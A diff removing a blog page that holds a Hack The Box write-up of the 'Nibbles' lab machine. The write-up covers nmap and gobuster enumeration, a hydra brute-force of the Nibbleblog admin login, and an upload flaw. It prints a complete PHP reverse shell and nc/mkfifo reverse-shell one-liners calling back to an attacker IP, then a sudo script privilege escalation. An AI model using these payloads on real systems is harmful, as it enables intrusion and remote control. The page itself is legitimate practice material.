@@ -1,510 +1,163 @@
-<!DOCTYPE html>
-<html lang="zh-cn">
-<head>
-
-  <meta charset="utf-8" />
-
-  
-  <title>Nibbles - Hack the box</title>
-
-  
-  
-  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
-  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
-  
-  <link href="//at.alicdn.com" rel="dns-prefetch">
-  
-  <link href="//fonts.googleapis.com" rel="dns-prefetch">
-  <link href="//fonts.gstatic.com" rel="dns-prefetch">
-  <link href="///disqus.com" rel="dns-prefetch">
-  <link href="//c.disquscdn.com" rel="dns-prefetch">
-  
-  
-  
-
-  
-
-  
-  <meta name="author" content="Neal">
-  <meta name="description" content="本文围绕《Nibbles - Hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。">
-
-  
-  
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:site" content="@gohugoio">
-    <meta name="twitter:title" content="Nibbles - Hack the box">
-    <meta name="twitter:description" content="本文围绕《Nibbles - Hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。">
-    <meta name="twitter:image" content="https://madneal.com/img/post-covers/nibbles-hack-the-box-771374afbf.jpg">
-  
-
-  
-  <meta property="og:type" content="article">
-  <meta property="og:title" content="Nibbles - Hack the box">
-  <meta property="og:description" content="本文围绕《Nibbles - Hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。">
-  <meta property="og:url" content="https://madneal.com/post/nibbles-hack-the-box/">
-  <meta property="og:image" content="https://madneal.com/img/post-covers/nibbles-hack-the-box-771374afbf.jpg">
-
-
-
-
-<meta name="generator" content="Hugo 0.163.3">
-
-
-<link rel="canonical" href="https://madneal.com/post/nibbles-hack-the-box/">
-
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="format-detection" content="telephone=no,email=no,adress=no">
-<meta http-equiv="Cache-Control" content="no-transform">
-
-
-<meta name="robots" content="index,follow">
-<meta name="referrer" content="origin-when-cross-origin">
-<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc">
-
-
-
-
-
-
-<meta name="theme-color" content="#02b875">
-<meta name="mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black">
-<meta name="apple-mobile-web-app-title" content="Neal&#39;s Blog">
-<meta name="msapplication-tooltip" content="Neal&#39;s Blog">
-<meta name='msapplication-navbutton-color' content="#02b875">
-<meta name="msapplication-TileColor" content="#02b875">
-<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
-<link rel="icon" href="https://madneal.com/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://madneal.com/icons/icon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://madneal.com/icons/icon-32x32.png">
-<link rel="icon" sizes="192x192" href="https://madneal.com/icons/icon-192x192.png">
-<link rel="apple-touch-icon" href="https://madneal.com/icons/icon-152x152.png">
-<link rel="manifest" href="https://madneal.com/manifest.json">
-
-
-<link rel="preload" href="https://madneal.com/styles/main-rendered.min.css" as="style">
-
-
-<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
-<link rel="preload" href="https://madneal.com/img/avatar.jpg" as="image">
-<link rel="preload" href="https://madneal.com/img/grey-prism.svg" as="image">
-
-
-<style>
-  body {
-    background: rgb(244, 243, 241) url('/img/grey-prism.svg') repeat fixed;
-  }
-</style>
-<link rel="stylesheet" href="https://madneal.com/styles/main-rendered.min.css">
-
-
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
-
-
-
-<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
-
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
-
-
-
-  
-  
-
-</head>
-  <body>
-    <div class="suspension">
-      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
-      
-        
-	<a role="button" aria-label="Go to comments" title="Go to comments" class="to-comment" href="#disqus_thread"><span class="icon icon-comment" aria-hidden="true"></span></a>
-        
-      
-    </div>
-    
-    
-  <header class="site-header">
-  <a class="avatar-link" href="https://madneal.com/"><img class="avatar" src="https://madneal.com/img/avatar.jpg" alt="Avatar" width="128" height="128" decoding="async"></a>
-  
-  <h2 class="title"><a href="https://madneal.com/">Neal&#39;s Blog</a></h2>
-  
-  <p class="subtitle">Development &amp; Security</p>
-  
-  <a class="wechat-link" href="https://madneal.com/img/wechat.jpg" rel="me" title="Wechat" aria-label="Wechat QR code">
-    <img class="wechat-qr" src="https://madneal.com/img/wechat.jpg" alt="Wechat QR code" width="180" height="180" loading="lazy" decoding="async">
-  </a>
-  
-  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
-    <span class="icon icon-menu" aria-hidden="true"></span>
-  </button>
-
-  <nav class="site-menu collapsed">
-    <h2 class="offscreen">Main Menu</h2>
-    <ul class="menu-list">
-      
-      
-      
-      
-        <li class="menu-item
-          
-          
-           is-active">
-          <a href="https://madneal.com/post">Home</a>
-        </li>
-      
-        <li class="menu-item
-          
-          
-          ">
-          <a href="https://github.com/madneal">Works</a>
-        </li>
-      
-        <li class="menu-item
-          
-          
-          ">
-          <a href="https://madneal.com/tags/">Tags</a>
-        </li>
-      
-        <li class="menu-item
-          
-          
-          ">
-          <a href="https://madneal.com/about/">About</a>
-        </li>
-      
-        <li class="menu-item
-          
-          
-          ">
-          <a href="https://madneal.com/privacy/">Privacy</a>
-        </li>
-      
-    </ul>
-  </nav>
-  <nav class="social-menu collapsed">
-    <h2 class="offscreen">Social Networks</h2>
-    <ul class="social-list"><li class="social-item">
-          <a href="mailto:bing.ecnu@gmail.com" title="Email" aria-label="Email">
-            <span class="icon icon-email" aria-hidden="true"></span>
-          </a>
-        </li><li class="social-item">
-          <a href="//github.com/madneal" rel="me" title="GitHub" aria-label="GitHub">
-	    <span class="icon icon-github" aria-hidden="true"></span>
-          </a>
-        </li><li class="social-item">
-          <a href="https://madneal.com/img/wechat.jpg" rel="me" title="Wechat" aria-label="Wechat">
-            <span class="icon icon-wechat" aria-hidden="true"></span>
-          </a>
-        </li></ul>
-  </nav>
-</header>
-
-  <section class="main post-detail">
-    <header class="post-header">
-      <h1 class="post-title">Nibbles - Hack the box</h1>
-      <p class="post-meta">@Neal · Mar 17, 2019 · 18 min read</p>
-    </header>
-    <article class="post-content"><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/47a5f56710b4.png" alt="Ae0G8g.png"></p>
-<h2 id="introduction">Introduction</h2>
-<p>Target: 10.10.10.75(OS: Linux)
-Kali linux: 10.10.16.44</p>
-<h2 id="information-enumeration">Information Enumeration</h2>
-<p>Firstly, detect the open ports:</p>
-<pre tabindex="0"><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/cc64bb41eafd.png" alt="Ae19BQ.png"></p>
-<p>There are not too many open ports, just <code>80</code> and <code>22</code>. Detect the detailed services of the open ports:</p>
-<pre tabindex="0"><code>nmap -sC -sV -oA services 10.10.10.75
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ebe33e24e983.png" alt="Ae1E90.png"></p>
-<p>Nothing special found. The only clue may be the open port of <code>80</code>. To be honest, the box with less open ports is easier in general.</p>
-<h2 id="exploit">Exploit</h2>
-<h3 id="http">Http</h3>
-<p>Access to <code>http://10.10.10.75</code>, just a web page of <code>hello world</code>.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5b9c2d80261d.png" alt="Ae0qsA.png"></p>
-<p>With the first sight, have not found anything special. Open the inspector, a comment can be found. Obviously, <code>nibbleblog</code> is quite important to us. Access to <code>http://10.10.10.75/nibbleblog</code>:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f945c2e25684.png" alt="Ae0XZt.png"></p>
-<p>It seems to be a blog demo. Try to access to each hyperlink in the web page, find nothing special. Try to use nikto to explore:</p>
-<pre tabindex="0"><code>nikto -host http://10.10.10.75/nibbleblog/
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f30066345eb7.png" alt="AeYklt.png"></p>
-<p><code>[nibbleblog](http://www.nibbleblog.com/)</code>  is an open source blog system which has been widely used. From the above screenshot, some interesting links can be found. And also try to brute force with <code>gobuster</code>:</p>
-<pre tabindex="0"><code>gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-</code></pre><p>Similarly, the directory of <code>nibbleblog</code> can be found, just like admin, content, etc. Open the README of the blog:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5f4d55418172.png" alt="AeYynK.png"></p>
-<p>The version is <code>4.0.3</code>. Google with <code>nibbleblog 4.0.3 exploit</code>. Find a <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">report</a> to talk about the exploit of nibbleblog of <code>4.0.3</code>.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/02391d3eb4dd.png" alt="AeYRtH.png"></p>
-<p>The research report is detailed. But there is a precondition that you have to obtain admin credentials. Access to login page: <code>http://10.10.10.75/nibbleblog/admin.php</code>.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a6399ea1bb93.png" alt="AeY5ct.png"></p>
-<p>Try the password of <code>123456</code> and <code>admin</code>. Both are not correct. I have even tried to use hydra:</p>
-<p><code>hydra -l admin -P /usr/share/wordlist/rockyou.txt -vV -f -t 2 10.10.10.75 http-post-form &quot;/nibbleblog/admin.php:username=^USER^&amp;password=^PASS^:login_error&quot;</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/999a82a4ffe9.png" alt="AetpuV.png"></p>
-<p>The hydra result shows that the password is <code>123456</code>. But it is not correct. I doubt it has something with the blacklist of <code>nibbleblog</code>. Whatever, try to figure out the password. Try <code>nibbles</code>. Wow, we are in. You should try every password as more as possible.</p>
-<p>As you have logged in. The above report can be used:</p>
-<ol>
-<li>Obtain Admin credentials (for example via Phishing via XSS which can be gained via CSRF, see advisory about CSRF in NibbleBlog 4.0.3)</li>
-<li>Activate My image plugin by visiting http://10.10.16.44/nibbleblog/admin.php?controller=plugins&amp;action=install&amp;plugin=my_image</li>
-<li>Upload PHP shell, ignore warnings</li>
-<li>Visit http://localhost/10.10.16.44/content/private/plugins/my_image/image.php. This is the default name of images uploaded via the plugin.</li>
-</ol>
-<p>Upload a reverse shell php file and use nc to listen to port <code>1234</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
-</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.16.44&#39;</span>;  <span style="color:#75715e">// CHANGE THIS
-</span></span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1234</span>;       <span style="color:#75715e">// CHANGE THIS
-</span></span></span><span style="display:flex;"><span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
-</span></span><span style="display:flex;"><span>$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; /bin/sh -i&#39;</span>;
-</span></span><span style="display:flex;"><span>$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>$debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Daemonise ourself if possible to avoid zombies later
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// pcntl_fork is hardly ever available, but will allow us to daemonise
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// our php process and avoid zombies.  Worth a try...
-</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#39;pcntl_fork&#39;</span>)) {
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Fork and have the parent process exit
-</span></span></span><span style="display:flex;"><span>	$pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcntl_fork</span>();
-</span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ($pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t fork&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ($pid) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>);  <span style="color:#75715e">// Parent exits
-</span></span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Make the current process a session leader
-</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Will only succeed if we forked
-</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">posix_setsid</span>() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Error: Can&#39;t setsid()&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Change to a safe directory
-</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Remove any umask we inherited
-</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">umask</span>(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Do the reverse shell...
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Open reverse connection
-</span></span></span><span style="display:flex;"><span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port, $errno, $errstr, <span style="color:#ae81ff">30</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$sock) {
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$errstr</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$errno</span><span style="color:#e6db74">)&#34;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Spawn shell process
-</span></span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>),  <span style="color:#75715e">// stdin is a pipe that the child will read from
-</span></span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>),  <span style="color:#75715e">// stdout is a pipe that the child will write to
-</span></span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)   <span style="color:#75715e">// stderr is a pipe that the child will write to
-</span></span></span><span style="display:flex;"><span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($shell, $descriptorspec, $pipes);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_resource</span>($process)) {
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t spawn shell&#34;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Set everything to non-blocking
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
-</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($sock, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Successfully opened reverse shell to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check for end of TCP connection
-</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($sock)) {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell connection terminated&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check for end of STDOUT
-</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($pipes[<span style="color:#ae81ff">1</span>])) {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell process terminated&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Wait until a command is end down $sock, or some
-</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">// command output is available on STDOUT or STDERR
-</span></span></span><span style="display:flex;"><span>	$read_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($sock, $pipes[<span style="color:#ae81ff">1</span>], $pipes[<span style="color:#ae81ff">2</span>]);
-</span></span><span style="display:flex;"><span>	$num_changed_sockets <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_select</span>($read_a, $write_a, $error_a, <span style="color:#66d9ef">null</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// If we can read from the TCP socket, send
-</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">// data to process&#39;s STDIN
-</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($sock, $read_a)) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK READ&#34;</span>);
-</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($sock, $chunk_size);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>], $input);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// If we can read from the process&#39;s STDOUT
-</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">// send data down tcp connection
-</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">1</span>], $read_a)) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT READ&#34;</span>);
-</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">1</span>], $chunk_size);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($sock, $input);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// If we can read from the process&#39;s STDERR
-</span></span></span><span style="display:flex;"><span>	<span style="color:#75715e">// send data down tcp connection
-</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">2</span>], $read_a)) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR READ&#34;</span>);
-</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">2</span>], $chunk_size);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($sock, $input);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($sock);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">2</span>]);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">proc_close</span>($process);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Like print, but does nothing if we&#39;ve daemonised ourself
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
-</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">printit</span> ($string) {
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$daemon) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$string</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
-</span></span></span></code></pre></div><p>Accomplish the last step, get the user shell!</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5380baf38eed.png" alt="AetbKx.png"></p>
-<h2 id="privilege-escalation">Privilege escalation</h2>
-<p>The next step is to get the root shell. Try to check the kernel of the linux:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/6fbf828a7774.png" alt="AeNAZ8.png"></p>
-<p>The kernel seems quite fresh. It may be hard to find the kernel exploit. Try to check the sudo permission of nibbler: <code>sudo -l</code>.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/abc6756263e3.png" alt="AeNuzn.png"></p>
-<p>Just as expected, find a file <code>monitor.sh</code> with root permission. Try to read the file with:</p>
-<pre tabindex="0"><code>cat /home/nibbler/personal/stuff/monitor.sh
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/e31074d67b3b.png" alt="AeNrdO.png"></p>
-<p>The file seems to be a bash script with several tasks. There is no need to understand the usage of the file. We can just modify the script to obtain root shell. So the script should be modified. As it is not convenient to modify the file in the victim machine directly. <code>Nc</code> can be used to send and receive file.</p>
-<p>As the sender:</p>
-<pre tabindex="0"><code>nc -w 3 10.10.16.44 1234 &lt; monitor.sh
-</code></pre><p>As the receiver:</p>
-<pre tabindex="0"><code>nc -lvnp 1234 &gt; monitor.sh
-</code></pre><p>You can change the send and receiver as needed. It is basic skills to transfer files between the victim machine and attack machine. <code>Nc</code> is a good tool in linux.</p>
-<p>Firstly, <code>nc</code> is used to reverse shell:</p>
-<pre tabindex="0"><code>nc -e 10.10.16.44 1111
-</code></pre><p>Try to set <code>nc</code> listen to <code>1111</code>:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d8b6d9829d09.png" alt="AeUA61.png"></p>
-<p>There&rsquo;s a problem with the <code>nc</code> in the victim machine. <code>e</code> option is invalid in the victim machine. May there are some solutions, but I turn to other reverse shell methods right away.</p>
-<pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f
-</code></pre><p>Send the <code>monitor.sh</code> to the victim machine and make sure to obtain the execution permission:</p>
-<pre tabindex="0"><code>chmod +x monitor.sh
-</code></pre><p>Establish the listen to <code>1234</code> in Kali linux and execute the <code>monitor.sh</code> in the victim machine:</p>
-<pre tabindex="0"><code>sudo ./monitor.sh
-</code></pre><p>Here is the root.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/00db624c19dd.png" alt="AeaECQ.png"></p>
-<h2 id="conclusion">Conclusion</h2>
